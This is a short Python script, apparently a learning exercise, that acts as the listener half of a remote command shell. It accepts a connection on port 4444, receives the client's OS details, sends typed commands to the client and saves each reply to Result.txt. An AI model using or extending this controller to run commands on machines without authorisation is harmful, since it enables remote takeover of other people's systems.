'''Mehrdad Moghadam'''

from socket import *
import subprocess

s = socket(2,1)
s.bind(("127.0.0.1",4444))
s.listen(5)

c,addr=s.accept()

print("connected")

uname = c.recv(12345)
print("Information Of Client OS : " , uname)

print( " -------------------------------------------------------")

while True:
    Command = input("Please Enter Your Command : ")
    c.send(str(Command).encode())
    cmd = c.recv(12345)
    f = open("Result.txt","w")
    f.write(str(cmd))
    f.close()

    


s.close()
